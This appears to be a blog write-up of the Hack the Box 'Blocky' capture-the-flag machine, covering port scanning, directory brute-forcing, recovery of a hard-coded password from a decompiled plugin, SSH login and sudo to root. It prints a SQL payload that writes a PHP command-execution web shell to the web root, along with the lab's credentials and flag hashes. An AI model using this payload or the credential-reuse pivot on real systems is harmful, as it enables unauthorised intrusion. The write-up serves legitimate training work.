@@ -1,0 +1,128 @@
+I"]0<p>Blocky is an easy level CTF challenge from the Hack the Box Archives. Developed by <a href="https://app.hackthebox.eu/users/2904">Arrexel</a>, the challenge consists of a linux machine configured as a Minecraft and wordpress server. It is easy to get carried away on this challenge, especially with poking at the wordpress and minecraft server, but once the user is compromised, escalation to root is trivial. My biggest takeaway from this CTF is to expand my basic directory brute force strategy to gaurentee a greater chance of discovery.</p>
+
+<h2 id="major-takeaways">Major Takeaway’s</h2>
+<p>1) Don’t reply on a simple <code class="language-plaintext highlighter-rouge">dirb</code> scan to brute force server directories <br />
+2) Ensure to test username/password pairs on multiple services</p>
+
+<h1 id="basic-enumeration">Basic Enumeration</h1>
+
+<p>To start, I used a simple <kbd>nmap</kbd> scan to look for running services and open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-p-</span> 10.10.10.37                                                                                                                                     1 ⨯
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-30 14:31 EDT
+Nmap scan report <span class="k">for </span>10.10.10.37
+Host is up <span class="o">(</span>0.029s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65530 filtered ports
+PORT      STATE  SERVICE   VERSION
+21/tcp    open   ftp       ProFTPD 1.3.5a
+22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open   http      Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: BlockyCraft &amp;#8211<span class="p">;</span> Under Construction!
+8192/tcp  closed sophos
+25565/tcp open   minecraft Minecraft 1.11.2 <span class="o">(</span>Protocol: 127, Message: A Minecraft Server, Users: 0/20<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose|WAP|specialized|storage-misc|broadband router|printer
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Linux 3.X|4.X|5.X|2.6.X <span class="o">(</span>94%<span class="o">)</span>, Asus embedded <span class="o">(</span>90%<span class="o">)</span>, Crestron 2-Series <span class="o">(</span>89%<span class="o">)</span>, HP embedded <span class="o">(</span>89%<span class="o">)</span>
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6
+Aggressive OS guesses: Linux 3.10 - 4.11 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.13 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.13 or 4.2 <span class="o">(</span>94%<span class="o">)</span>, Linux 4.2 <span class="o">(</span>94%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.16 - 4.6 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.12 <span class="o">(</span>91%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>91%<span class="o">)</span>, Linux 3.8 - 3.11 <span class="o">(</span>91%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 8192/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   31.60 ms 10.10.14.1
+2   31.65 ms 10.10.10.37
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>202.01 seconds
+</code></pre></div></div>
+
+<p>The resulting scan shows several running processes. I did some basic research on each service version to check for known vulnerabilities. At first, it seemed that the ProFTPD server might be vulnerable to the <code class="language-plaintext highlighter-rouge">mod_copy</code> exploit described in CVE-2015-3306. After trying a couple different PoC exploits, the target did not seem vulnerable so I moved on. Using <code class="language-plaintext highlighter-rouge">gobuster</code>, I searched for directories on the host.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.37 <span class="nt">-w</span> /home/kali/eWPT/kali-tools/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.37
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /home/kali/eWPT/kali-tools/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/03/30 14:42:00 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/wiki                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/wiki/]
+/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/wp-content/]
+/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/plugins/]   
+/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/wp-includes/]
+/javascript           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/javascript/] 
+/wp-admin             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/wp-admin/]   
+/phpmyadmin           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.37/phpmyadmin/] 
+</code></pre></div></div>
+
+<p>The resulting output indicated the /plugins directory, which when browsed, showed a custom plugin called BlockCore.jar. I downloaded the file and used the java decompiler tool <code class="language-plaintext highlighter-rouge">jd-gui</code> to inspect the classes. The class blockycore uses a hard-coded username and password, root:8YsqfCTnvxAUeduzjNSXe22.</p>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-30-04-blocky-hack-the-box-walkthrough/blockycore.png" />
+    </div>
+</div>
+<p><br /></p>
+
+<h1 id="compromise-user">Compromise User</h1>
+
+<p>With a pair of found credentials, I attempted to access the wordpress site with no luck. Eventually I found that I could use the credentials to log into the phpmyadmin instance. As administrator of phpmyadmin, I was sure I could pivot to gain access to the machine. I attempted to create a new user account for the wordpress site, change the current “notch” user’s password, and even upload a reverse shell using direct sql commands. None of these options worked, however a technique I came across described by Ryan Trost in the book “Practical Intrusion Analysis: Prevention and Detection for the Twenty-First Century: Prevention and Detection for the Twenty-First Century” was fairly interesting. It involves injecting  SQL command to insert a backdoor php file,</p>
+
+<pre><code class="language-SQL">select “&lt;? System($_REQUEST[‘cmd’]); ?&gt;” into outfile “/var/www/html/cmd.php”;
+</code></pre>
+
+<p>In this instance, this method was blocked by insufficient file permissions, but I will be sure to consider this on future challenges. Ultimately, I was able to get root by attempting to log into the ssh service with the notch user and the admin credentials found in the jar file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop]
+└─<span class="nv">$ </span>ssh notch@10.10.10.37
+notch@10.10.10.37<span class="s1">'s password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
+notch@Blocky:~$ 
+</span></code></pre></div></div>
+<h2 id="user-flag">User Flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~<span class="nv">$ </span><span class="nb">ls
+</span>minecraft  user.txt
+notch@Blocky:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+59fee0977fb60b8a0bc6e41e751f3cd5notch@Blocky:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="compromise-root">Compromise Root</h2>
+
+<p>I instinctively tried to sudo to root, and was suprised when the notch user had permissions to do so. As root, I read the final flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~<span class="nv">$ </span><span class="nb">sudo </span>su root
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>notch: 
+Sorry, try again.
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>notch: 
+root@Blocky:/home/notch# <span class="nb">cat</span> ../../root/root.txt
+0a9694a5b4d272c694679f7860f1cd5froot@Blocky:/home/notch# 
+</code></pre></div></div>
+:ET
